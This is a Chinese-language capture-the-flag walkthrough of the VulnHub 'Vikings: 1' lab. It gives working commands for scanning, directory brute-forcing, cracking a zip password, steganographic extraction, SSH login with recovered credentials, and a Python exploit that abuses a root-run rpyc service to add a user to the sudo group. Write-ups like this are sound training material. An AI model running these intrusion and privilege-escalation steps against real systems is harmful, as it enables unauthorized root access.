靶机地址：[Vikings: 1 ~ VulnHub](https://www.vulnhub.com/entry/vikings-1,741/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.37
sudo nmap -p22,80 -sV 192.168.1.37
# 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.29
```
先访问Web服务看看，查看前端源码，没发现什么特别的
web路径扫描
```Shell
sudo dirsearch -u http://192.168.1.37
# /site/
sudo dirsearch -u http://192.168.1.37/site/
# /site/js/
# 看了一下没发现什么有价值的东西

# 一定要试试其它扫描工具和字典
gobuster dir -u http://192.168.1.37 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,jsp,html,js,txt
gobuster dir -u http://192.168.1.37/site -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,jsp,html,js,txt
```
扫出一个 `/site/war.txt` ，里面的内容是：`war-is-over` 。
访问 `/site/war-is-over/` ，内容像是一串编码过的字符
使用 [CyberChef](https://gchq.github.io/CyberChef) 进行解码，先加载 `From Base64` 模块，发现结果是一堆以 `PK` 开头的乱码。
再加载 `Entropy` 模块查看这段数据的熵值，如果熵值比较大的话（达到7.5），可以推测这段数据可能是经过压缩的。
关闭 `Entropy` 模块，加载 `Detect File Type` 模块，识别文件类型，结果如下
```
File type:   PKZIP archive
Extension:   zip
MIME type:   application/zip
```
可能是一个zip文件，关闭 `Detect File Type` 模块，将 `Output` 保存下来看看，后缀名改成 `.zip` 。尝试解压缩，发现需要输入密码。尝试暴力破解
```Shell
zip2john war.zip > war_zip.john
john war_zip.john --wordlist=/home/kali/Tools/Custom/rockyou.txt
# ragnarok123
```
成功解压缩但不知道是什么类型的文件无法打开，在 [CyberChef](https://gchq.github.io/CyberChef) 的Input中选择Open file as input，还是调用 `Detect File Type` 模块，识别文件类型，结果如下
```
File type:   Joint Photographic Experts Group image
Extension:   jpg,jpeg,jpe,thm,mpo
MIME type:   image/jpeg
```
改了后缀名，打开看了一下，没发现什么特别的地方。
可能使用了隐写术
```Shell
steghide info king.jpg
```
需要再次输入密码，尝试了几种，没有成功
查看文件中的嵌入签名
```Shell
binwalk -B king.jpg
# 1429567       0x15D03F        Zip archive data, at least v2.0 to extract, compressed size: 53, uncompressed size: 92, name: user
```
可以看到里面藏着一个压缩文件，提取
```Shell
binwalk -e king.jpg
```
运行完发现不光把压缩包提取出来了，里面的 `user` 文件也自动解压了
查看一下文件内容
```Shell
cat _king.extracted/user
# //FamousBoatbuilder_floki@vikings
# //f@m0usboatbuilde7
```
像是SSH的账号密码，试试看
```Shell
ssh FamousBoatbuilder_floki@192.168.1.37
```
失败了，再试试
```Shell
ssh floki@192.168.1.37
```
成功登录目标系统
信息收集一下
```Shell
ls
# boat  readme.txt
ls /home
# floki  ragnar
```
查看 `readme.txt` 和 `boat` 文件，可以看到一些提示，大意是通过 `boat` 可以提权到 `ragnar` 用户。查看 `boat` 文件，内容如下
```
#Printable chars are your ally.
#num = 29th prime-number.
collatz-conjecture(num)
```
第29个质数是109，考拉兹猜想
```Python
def collatz(x):
        result = [x]
        while x != 1:
                if x % 2 == 1:
                        x = 3 * x + 1
                else:
                        x = x / 2
                result.append(int(x))
        return result

def printable(l):
    res = []
    for num in l:
        if num >= 32 and num <= 126:
            res.append(num)
    return res

print(printable(collatz(109)))
```
ASCII中，可打印字符的最终序列为
```
109, 82, 41, 124, 62, 94, 47, 71, 107, 121, 91, 103, 122, 61, 92, 46, 70, 35, 106, 53, 80, 40
```
通过 [CyberChef](https://gchq.github.io/CyberChef) 的 `From Decimal` 模块，将十进制数转换一下，结果如下
如果没用通过脚本筛选可打印字符，可以使用 `Strings` 模块筛选
```
mR)|>^/Gky[gz=\.F#j5P(
```
尝试提权为 `ragnar`
```Shell
su ragnar
```
成功了，获取到第一个flag
先开一下bash
```Shell
bash
```
尝试提权
```Shell
ls -l /etc/passwd
# 没有编辑权限
sudo -l
# 没有sudo权限
crontab -l
# 没有定时任务
find / -perm -u=s -type f -user root -executable ! -group root 2>/dev/null -exec ls -l {} \;
# 没有可利用的SUID文件
```
查看服务状态
```Shell
cat .profile
# sudo python3 /usr/local/bin/rpyc_classic.py
```
查看官方文档，默认端口18812，查看服务状态
```Shell
ss -antlp
```
18812是开启的，尝试利用
将当前用户加入到sudo组中的Python脚本
```Python
import rpyc

def exp():
	# import必须放在函数里
    import os
    # 当前用户加入到sudo组
    os.system("sudo usermod -a -G sudo ragnar")

conn = rpyc.classic.connect('127.0.0.1')
fn = conn.teleport(exp)
fn()
```
上传到服务器上执行看看
```Shell
python3 exp.py
```
退出后重新登录
```Shell
sudo su
```
成功提权

其它提权方式：[[20 CVE#CVE-2022-2588|CVE-2022-2588]]
